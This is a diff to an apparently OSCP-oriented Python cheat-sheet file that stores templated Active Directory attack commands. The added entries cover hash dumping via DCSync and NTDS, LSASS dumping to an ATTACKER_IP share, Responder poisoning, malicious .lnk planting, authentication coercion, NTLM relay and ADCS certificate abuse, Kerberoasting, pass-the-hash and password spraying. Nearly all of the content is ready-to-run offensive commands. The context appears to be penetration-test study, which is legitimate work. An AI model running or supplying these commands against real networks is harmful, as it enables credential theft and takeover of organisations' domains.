@@ -190,19 +190,29 @@ ATTACKS = {
         "risk": "CRITICAL",
         "attacks": [
             {
-                "tool": "Impacket secretsdump",
-                "cmd": "impacket-secretsdump '{domain}/{source}:{password}'@{dc_ip}",
-                "note": "Dump all domain hashes — grab Administrator NTLM for PtH",
+                "tool": "NXC (cleaner output)",
+                "cmd": "nxc smb {dc_ip} -u {source} -p '{password}' -d {domain} --ntds\n# Dump only enabled accounts:\nnxc smb {dc_ip} -u {source} -p '{password}' -d {domain} --ntds --enabled\n# Dump single user:\nnxc smb {dc_ip} -u {source} -p '{password}' -d {domain} --ntds --user Administrator",
+                "note": "Easier to read than secretsdump — columns: user:rid:lmhash:nthash",
             },
             {
-                "tool": "Impacket secretsdump (with hash)",
+                "tool": "NXC (pass-the-hash)",
+                "cmd": "nxc smb {dc_ip} -u {source} -H '{hash}' -d {domain} --ntds",
+                "note": "DCSync with an NTLM hash instead of a password",
+            },
+            {
+                "tool": "Impacket secretsdump",
+                "cmd": "impacket-secretsdump '{domain}/{source}:{password}'@{dc_ip}",
+                "note": "Classic dump — verbose output includes Kerberos keys too",
+            },
+            {
+                "tool": "Impacket secretsdump (PtH)",
                 "cmd": "impacket-secretsdump '{domain}/{source}'@{dc_ip} -hashes :{hash}",
-                "note": "DCSync using a pass-the-hash",
+                "note": "Pass-the-hash variant",
             },
             {
                 "tool": "Mimikatz",
                 "cmd": "mimikatz # lsadump::dcsync /domain:{domain} /user:Administrator",
-                "note": "DCSync from a Windows foothold with Mimikatz",
+                "note": "From a Windows foothold",
             },
         ],
     },
@@ -298,13 +308,18 @@ ATTACKS = {
         "attacks": [
             {
                 "tool": "xfreerdp",
-                "cmd": "xfreerdp /v:{target} /u:{source} /p:'{password}' /d:{domain} +clipboard /dynamic-resolution",
-                "note": "RDP session",
+                "cmd": "xfreerdp /d:{domain} /u:{source} /p:'{password}' /v:{target} /cert-ignore /drive:WORKSPACE,/workspace /drive:TOOLS,$HOME/oscp-tools/windows /dynamic-resolution",
+                "note": "Mounts /workspace + killchain tools folder (~/oscp-tools/windows) — access as \\\\tsclient\\TOOLS inside RDP",
+            },
+            {
+                "tool": "xfreerdp (PtH)",
+                "cmd": "xfreerdp /d:{domain} /u:{source} /pth:{hash} /v:{target} /cert-ignore /drive:WORKSPACE,/workspace /drive:TOOLS,$HOME/oscp-tools/windows /dynamic-resolution",
+                "note": "Pass-the-hash RDP — requires Restricted Admin mode on target",
             },
             {
                 "tool": "rdesktop",
                 "cmd": "rdesktop -u {source} -p '{password}' -d {domain} {target}",
-                "note": "Alternative RDP client",
+                "note": "Fallback RDP client",
             },
         ],
     },
@@ -357,15 +372,221 @@ ATTACKS = {
 
 STANDALONE_ATTACKS = {
 
+    "Null Auth & Initial Enum": {
+        "desc": "Check for unauthenticated access — null session, guest, anonymous LDAP",
+        "attacks": [
+            {
+                "tool": "NXC — null + guest share enum",
+                "cmd": "nxc smb {dc_ip} -u '' -p '' --shares\nnxc smb {dc_ip} -u 'Guest' -p '' --shares",
+            },
+            {
+                "tool": "NXC — enumerate users + export",
+                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --users\n# Export directly to file (no awk needed):\nnxc smb {dc_ip} -u 'Guest' -p '' --users-export users.txt",
+            },
+            {
+                "tool": "NXC — password policy + groups",
+                "cmd": "nxc smb {dc_ip} -u '' -p '' --pass-pol\nnxc smb {dc_ip} -u '' -p '' --groups",
+            },
+            {
+                "tool": "NXC — filter shares by permission",
+                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --shares\n# Filter to only writable:\nnxc smb {dc_ip} -u 'Guest' -p '' --shares WRITE\n# Filter to readable:\nnxc smb {dc_ip} -u 'Guest' -p '' --shares READ",
+            },
+            {
+                "tool": "NXC — RID brute (get all account names)",
+                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --rid-brute",
+                "note": "Returns usernames by RID — useful when --users is blocked",
+            },
+            {
+                "tool": "enum4linux-ng",
+                "cmd": "enum4linux-ng -A {dc_ip}",
+                "note": "Full null session enumeration: users, groups, shares, password policy",
+            },
+        ],
+    },
+
+    "LLMNR Poisoning": {
+        "desc": "Poison LLMNR/NBT-NS to steal Net-NTLMv2 hashes from broadcast traffic",
+        "attacks": [
+            {
+                "tool": "Step 1 — Start Responder",
+                "cmd": "responder -I tun0",
+                "note": "Poisons LLMNR/NBT-NS — hashes saved to /usr/share/responder/logs/",
+            },
+            {
+                "tool": "Step 2 — Plant slinky (if writeable share exists)",
+                "cmd": "nxc smb {target} -u 'Guest' -p '' -M slinky -o SERVER=ATTACKER_IP NAME=not-malicious SHARES=Uploads",
+                "note": "Anyone who opens the share triggers auth to your Responder",
+            },
+            {
+                "tool": "Step 3 — Crack NTLMv2",
+                "cmd": "hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt",
+            },
+        ],
+    },
+
+    "Timeroasting": {
+        "desc": "Crack machine account passwords using SNTP — works without any credentials",
+        "attacks": [
+            {
+                "tool": "Step 1 — RID brute to get account IDs",
+                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --rid-brute",
+                "note": "Note the RID numbers — you'll match them to cracked hashes",
+            },
+            {
+                "tool": "Step 2 — Timeroast",
+                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' -M timeroast",
+            },
+            {
+                "tool": "Step 3 — Crack SNTP hashes",
+                "cmd": "hashcat -m 31300 sntp.hashes /usr/share/wordlists/rockyou.txt",
+                "note": "Match cracked RID back to account name from step 1",
+            },
+            {
+                "tool": "Reference",
+                "cmd": "# https://www.thehacker.recipes/ad/movement/kerberos/roasting/timeroast",
+            },
+        ],
+    },
+
+    "BloodHound Collection": {
+        "desc": "Collect AD data for BloodHound attack path analysis",
+        "attacks": [
+            {
+                "tool": "NXC LDAP ingestor (preferred)",
+                "cmd": "nxc ldap {domain} -u {source} -p '{password}' --bloodhound --collection All --dns-server {dc_ip}",
+                "note": "Outputs .zip directly — drag into BloodHound UI",
+            },
+            {
+                "tool": "bloodyAD bloodhound export",
+                "cmd": "bloodyad -H {dc_ip} -d {domain} -u {source} -p '{password}' get bloodhound",
+            },
+            {
+                "tool": "rusthound (faster on large domains)",
+                "cmd": "rusthound -d {domain} -u '{source}' -p '{password}' -n {dc_ip} --adcs -o ./bloodhound_output",
+            },
+            {
+                "tool": "SharpHound (Windows foothold)",
+                "cmd": "# Upload via evil-winrm:\nupload $HOME/oscp-tools/ad/SharpHound.exe\n.\\SharpHound.exe -c All\n# Download the zip:\ndownload <timestamp>_BloodHound.zip",
+            },
+        ],
+    },
+
+    "Kerberos Delegation": {
+        "desc": "Abuse constrained/unconstrained delegation to impersonate privileged users",
+        "attacks": [
+            {
+                "tool": "Step 1 — Find delegation (NXC)",
+                "cmd": "nxc ldap {dc_ip} -u {source} -p '{password}' --find-delegation",
+            },
+            {
+                "tool": "Step 2 — Get service ticket (Impacket getST)",
+                "cmd": "impacket-getST -spn TARGET_SPN -impersonate Administrator -dc-ip {dc_ip} '{domain}/{source}:{password}'",
+                "note": "TARGET_SPN from BloodHound or --find-delegation output",
+            },
+            {
+                "tool": "Step 3 — Export + use ticket",
+                "cmd": "export KRB5CCNAME=Administrator.ccache\nnxc smb {domain} -u Administrator -k --use-kcache",
+            },
+        ],
+    },
+
+    "ADCS ESC1": {
+        "desc": "Certificate template allows SAN — enroll as any user including Administrator",
+        "attacks": [
+            {
+                "tool": "Step 1 — Find vulnerable templates (certipy)",
+                "cmd": "certipy find -u '{source}@{domain}' -p '{password}' -dc-ip {dc_ip} -text -enabled -vulnerable",
+            },
+            {
+                "tool": "Step 2 — Request cert as Administrator",
+                "cmd": "certipy req -u '{source}@{domain}' -p '{password}' -dc-ip {dc_ip} -target CA.{domain} -ca DOMAIN-CA -template UserTemplate -upn 'Administrator@{domain}'",
+                "note": "Replace DOMAIN-CA and UserTemplate with values from step 1",
+            },
+            {
+                "tool": "Step 3 — Authenticate and get hash",
+                "cmd": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}",
+                "note": "Returns NT hash — use with PtH",
+            },
+            {
+                "tool": "Reference",
+                "cmd": "# https://github.com/ly4k/Certipy/wiki",
+            },
+        ],
+    },
+
+    "ADCS ESC8": {
+        "desc": "NTLM relay to AD CS HTTP endpoint — coerce any machine to get its cert",
+        "attacks": [
+            {
+                "tool": "Step 1 — Find web enrollment endpoint",
+                "cmd": "certipy find -u '{source}@{domain}' -p '{password}' -dc-ip {dc_ip} -text -enabled -vulnerable",
+            },
+            {
+                "tool": "Step 2 — Set up NTLM relay to certsrv",
+                "cmd": "ntlmrelayx.py -t http://DC.{domain}/certsrv/certfnsh.asp --adcs --template User -smb2support",
+                "note": "Terminal 1 — relay to the CA web enrollment page",
+            },
+            {
+                "tool": "Step 3 — Coerce target to relay",
+                "cmd": "nxc smb {target} -u {source} -p '{password}' -M coerce_plus -o LISTENER=ATTACKER_IP",
+                "note": "Terminal 2 — force target DC/machine to authenticate",
+            },
+            {
+                "tool": "Step 4 — Authenticate with received cert",
+                "cmd": "certipy auth -pfx <received>.pfx -dc-ip {dc_ip}",
+            },
+        ],
+    },
+
+    "Dump Hashes (Post-Compromise)": {
+        "desc": "Extract credentials once you have local/domain admin access",
+        "attacks": [
+            {
+                "tool": "NXC — dump LSASS (lsassy)",
+                "cmd": "nxc smb {target} -d {domain} -u {source} -H '{hash}' -M lsassy",
+                "note": "Dumps LSASS remotely — no upload needed",
+            },
+            {
+                "tool": "NXC — dump SAM/LSA registry",
+                "cmd": "nxc smb {target} -d {domain} -u {source} -p '{password}' --sam\nnxc smb {target} -d {domain} -u {source} -p '{password}' --lsa",
+            },
+            {
+                "tool": "NXC — dump NTDS (domain admin required)",
+                "cmd": "nxc smb {dc_ip} -d {domain} -u {source} -p '{password}' --ntds",
+            },
+            {
+                "tool": "Evil-WinRM — upload mimikatz",
+                "cmd": "upload $HOME/oscp-tools/ad/mimikatz/x64/mimikatz.exe\n.\\mimikatz.exe\nprivilege::debug\nsekurlsa::logonPasswords",
+            },
+            {
+                "tool": "LSASS dump offline (comsvcs.dll)",
+                "cmd": "# On target — find lsass PID:\ntasklist | findstr lsass\n# Dump to attacker SMB share:\nsmbserver.py -smb2support share .\nrundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <PID> \\\\ATTACKER_IP\\share\\lsass.dmp full\n# Parse offline:\npypykatz lsa minidump lsass.dmp",
+            },
+        ],
+    },
+
     "Kerberoasting": {
         "desc": "Crack service account passwords from TGS tickets",
         "attacks": [
+            {
+                "tool": "NXC (preferred)",
+                "cmd": "nxc ldap {dc_ip} -u {source} -p '{password}' --kerberoasting kerberoast.hash",
+            },
+            {
+                "tool": "NXC via Chisel/proxychains",
+                "cmd": "proxychains nxc ldap {domain} -u {source} -p '{password}' --kerberoasting kerberoast.hash",
+            },
+            {
+                "tool": "NXC via Ligolo",
+                "cmd": "nxc ldap 240.0.0.1 -u {source} -p '{password}' --kerberoasting kerberoast.hash",
+                "note": "240.0.0.1 = DC localhost via Ligolo magic CIDR",
+            },
             {
                 "tool": "Impacket",
                 "cmd": "impacket-GetUserSPNs '{domain}/{source}:{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.hash",
             },
             {
-                "tool": "Rubeus",
+                "tool": "Rubeus (Windows foothold)",
                 "cmd": "Rubeus.exe kerberoast /outfile:kerberoast.hash",
             },
             {
@@ -379,11 +600,19 @@ STANDALONE_ATTACKS = {
         "desc": "Crack passwords of accounts with pre-auth disabled",
         "attacks": [
             {
+                "tool": "NXC — step 1: get users (null/guest auth)",
+                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --users-export users.txt",
+            },
+            {
+                "tool": "NXC — step 2: ASREP roast the list",
+                "cmd": "nxc ldap {dc_ip} -u users.txt -p '' --asreproast asrep.hash\n# Or with valid creds:\nnxc ldap {dc_ip} -u {source} -p '{password}' --asreproast asrep.hash\n# If DNS fails:\nnxc ldap {dc_ip} -u {source} -p '{password}' --asreproast asrep.hash --kdcHost {domain}",
+            },
+            {
                 "tool": "Impacket",
                 "cmd": "impacket-GetNPUsers '{domain}/' -usersfile users.txt -no-pass -dc-ip {dc_ip} -outputfile asrep.hash",
             },
             {
-                "tool": "Rubeus",
+                "tool": "Rubeus (Windows foothold)",
                 "cmd": "Rubeus.exe asreproast /outfile:asrep.hash",
             },
             {
@@ -397,8 +626,8 @@ STANDALONE_ATTACKS = {
         "desc": "Test one password against many accounts",
         "attacks": [
             {
-                "tool": "netexec",
-                "cmd": "netexec smb {dc_ip} -u users.txt -p 'Welcome1!' -d {domain} --continue-on-success",
+                "tool": "NXC",
+                "cmd": "nxc smb {dc_ip} -u users.txt -p 'Welcome1!' -d {domain} --continue-on-success",
             },
             {
                 "tool": "kerbrute",
@@ -423,27 +652,38 @@ STANDALONE_ATTACKS = {
                 "cmd": "evil-winrm -i {target} -u {source} -H '{hash}'",
             },
             {
-                "tool": "netexec",
-                "cmd": "netexec smb {target} -u {source} -H '{hash}' -d {domain} -x 'whoami'",
+                "tool": "NXC",
+                "cmd": "nxc smb {target} -u {source} -H '{hash}' -d {domain} -x 'whoami'",
             },
         ],
     },
 
     "Coerced Authentication": {
-        "desc": "Force a machine to authenticate to your listener (PetitPotam, PrinterBug, etc.)",
+        "desc": "Force a machine to authenticate to your listener (PetitPotam, PrinterBug, coerce_plus, etc.)",
         "attacks": [
             {
+                "tool": "NXC coerce_plus module (easiest)",
+                "cmd": "nxc smb {target} -u {source} -p '{password}' -M coerce_plus -o LISTENER=ATTACKER_IP",
+                "note": "Tries multiple coercion methods automatically — catches with Responder",
+            },
+            {
+                "tool": "Responder (capture hashes)",
+                "cmd": "sudo responder -I tun0",
+                "note": "Start this BEFORE coercing — captures Net-NTLMv2",
+            },
+            {
+                "tool": "NXC slinky (writeable share coercion)",
+                "cmd": "nxc smb {target} -u 'Guest' -p '' -M slinky -o SERVER=ATTACKER_IP NAME=not-malicious SHARES=Uploads",
+                "note": "Plants an .lnk file in a share — triggers auth when anyone browses it",
+            },
+            {
                 "tool": "PetitPotam",
-                "cmd": "python3 PetitPotam.py -u {source} -p '{password}' -d {domain} LISTENER_IP {target}",
+                "cmd": "python3 PetitPotam.py -u {source} -p '{password}' -d {domain} ATTACKER_IP {target}",
             },
             {
-                "tool": "Inveigh (capture)",
+                "tool": "Inveigh (Windows foothold capture)",
                 "cmd": "Inveigh.exe -ConsoleOutput Y -FileOutput Y",
-                "note": "Run on your foothold to capture Net-NTLMv2 hashes",
-            },
-            {
-                "tool": "Responder (capture)",
-                "cmd": "sudo responder -I tun0 -dwPv",
+                "note": "Run on Windows foothold to capture Net-NTLMv2",
             },
             {
                 "tool": "Hashcat (NTLMv2)",
